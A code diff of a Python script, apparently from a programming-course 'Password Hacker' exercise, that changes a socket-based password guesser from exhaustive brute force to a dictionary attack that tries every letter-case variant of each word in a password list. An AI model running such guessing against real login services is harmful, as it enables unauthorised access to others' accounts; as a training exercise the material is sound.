@@ -3,24 +3,26 @@ def hack(ip, port):
     hack_sock = socket.socket()
     address = (ip, int(port))
     hack_sock.connect(address)
-    nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
-    import string
-    alphabet_list = list(string.ascii_lowercase) + nums
     import itertools
-    counter = 1
-    x = 0
-    while x == 0:
-        for psy in itertools.product(alphabet_list, repeat=counter):
-            pw = ''.join(psy)
-            pwd = pw.encode()
-            hack_sock.send(pwd)
+    a = open('C:/Users/Carbon/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt', "r")
+    import itertools
+    counter = 0
+    for i in a:
+        if counter != 0:
+            break
+        i = i.strip("\n")
+        psy = i
+        search = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in psy)))
+        for m in search:
+            message = m.encode()
+            hack_sock.send(message)
             response = hack_sock.recv(1024)
             response = response.decode()
             if response == "Connection success!":
-                print(pw)
-                x = 1
+                print(m)
+                counter = 1
                 break
-        counter += 1
+
     hack_sock.close()
 
 import sys
